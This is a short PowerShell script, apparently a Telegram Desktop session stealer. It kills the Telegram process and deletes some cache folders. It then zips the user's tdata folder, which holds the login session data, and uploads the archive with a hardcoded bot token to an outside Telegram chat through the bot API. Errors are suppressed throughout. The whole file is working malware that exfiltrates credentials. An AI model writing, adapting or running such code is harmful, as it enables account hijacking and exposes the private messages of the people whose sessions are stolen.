# Stop and remove Telegram process

$processName = "telegram"
try {
    if (Get-Process $processName -ErrorAction SilentlyContinue) {
        Get-Process -Name $processName | Stop-Process
    }
} catch {
    # Write-Host "Something went wrong..."
}

# Remove Telegram data folders
$userName = $env:USERNAME
$userDataPath = "C:\Users\$userName\AppData\Roaming\Telegram Desktop\tdata\user_data"
$emojiPath = "C:\Users\$userName\AppData\Roaming\Telegram Desktop\tdata\emoji"

try {
    Remove-Item $userDataPath -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item $emojiPath -Recurse -Force -ErrorAction SilentlyContinue
} catch {
    # Write-Host "Something went wrong..."
}

# Compress Telegram data folder
$sourceFolder = "C:\Users\$userName\AppData\Roaming\Telegram Desktop\tdata"
$zipFile = "C:\Users\$userName\AppData\Roaming\Telegram Desktop\tdata.zip"
$maxSize = 50 * 1MB # Convert to bytes

if (Test-Path $zipFile) {
    Remove-Item $zipFile
}

Add-Type -AssemblyName System.IO.Compression.FileSystem
[System.IO.Compression.ZipFile]::CreateFromDirectory($sourceFolder, $zipFile, "Optimal", $false)

Get-ChildItem $zipFile | Where-Object { $_.Length -gt $maxSize } | ForEach-Object {
    Write-Host "Removing $($_.FullName)..."
    Remove-Item $_.FullName
}

# Send compressed data to Telegram

$token = "6048991109:AAGrNMZFXfIQ3eiVJUq5kMFlC7TIVfsIuD4"
$chatId = "5305213226"

# Prepare the Telegram API URL
$telegramApiUrl = "https://api.telegram.org/bot$token/sendDocument"

# Prepare the file to be uploaded
$document = Get-Item $zipFile

# Build the request parameters
$params = @{
    chat_id = $chatId
    document = $document
}

try {
    # Use Invoke-RestMethod to send the document to Telegram
    Invoke-RestMethod -Uri $telegramApiUrl -Method Post -Form $params
} catch {
    Write-Host "Something went wrong while sending the document to Telegram..."
}
